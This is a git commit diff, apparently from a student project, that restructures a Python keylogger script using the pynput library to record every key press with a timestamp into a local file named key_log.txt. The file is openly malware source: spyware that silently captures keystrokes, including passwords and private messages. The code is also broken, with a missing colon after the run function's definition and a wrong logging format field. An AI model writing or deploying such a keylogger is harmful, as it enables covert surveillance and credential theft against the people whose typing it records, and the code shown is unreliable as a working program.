e8a69c54c42b99ce05567d4284b0bccceeb1595c
AaronCummings10 <amc49@pct.edu>
2020-04-08 11:44:39 -0400

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,19 +1,18 @@
 #!/usr/bin/env python3
 
-def run(**args)
 
-    from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir = ""
+logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(messages)s:')
     
-    import logging
-    
-    log_dir = ""
-    
-    logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(messages)s:')
-    
-    def on_press(key):
-        logging.info(str(key))
-        #if key ==Key.esc:
-            #return false
-    
+def on_press(key):
+    logging.info(str(key))
+    #if key ==Key.esc:
+        #return false
+            
+def run(**args) 
+
     with Listener(on_press=on_press) as listener:
         listener.join()
